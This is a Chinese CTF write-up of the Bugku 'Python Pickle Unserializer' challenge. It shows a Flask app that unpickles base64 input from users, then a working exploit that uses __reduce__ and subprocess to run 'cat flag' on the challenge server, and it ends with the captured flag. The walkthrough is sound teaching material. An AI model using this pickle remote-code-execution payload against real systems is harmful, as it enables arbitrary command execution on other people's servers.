# Bugku题解

#### Python Pickle Unserializer

打开环境![image-20240406160306497](Bugku%E9%A2%98%E8%A7%A3.assets/image-20240406160306497.png)

源代码也没有发现什么东西，那么进行dirsearch目录扫描一下

扫出来flag和source两个页面，其中flag页面没用，source页面有源代码

![image-20240406160545262](Bugku%E9%A2%98%E8%A7%A3.assets/image-20240406160545262.png)

```py
#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@ Author: HeliantHuS
@ Codes are far away from bugs with the animal protecting
@ Time:  2021-08-05
@ FileName: main.py
"""
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return """
        <title>404 Not Found</title>
        <h1>Not Found</h1>
        <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
    """, 666, [("TIPS", "/source")]

@app.route("/source", methods=["GET"])
def source():
    with open(__file__, "r") as fp:
        return fp.read()

@app.route("/flag", methods=["PUT"])
def get_flag():
    try:
        data = request.json
        if data:
            return pickle.loads(base64.b64decode(data["payload"]))
        return "MISSED"
    except:
        return "OH NO!!!"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
```

在get_flag函数当中采用了pickle.loads函数，再结合这道题的名字，不难看出是一个Python反序列化的题目

```py
#!/usr/bin/python3
import subprocess
import pickle
import base64
import httpx
class A(object):
    def __reduce__(self):
        s = '''
import subprocess
r = subprocess.run(
    'cat flag',
    shell=True,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)
print(r.stdout.decode())
        '''
        return (subprocess.check_output,(["python3","-c",s],))
a = A()
data = {'payload':base64.b64encode(pickle.dumps(a)).decode()}
r = httpx.put('http://114.67.175.224:12340/flag',json=data)
print(r.text)
```

即可得到flag{971a0c6f889f002d0dddf71d050139dd}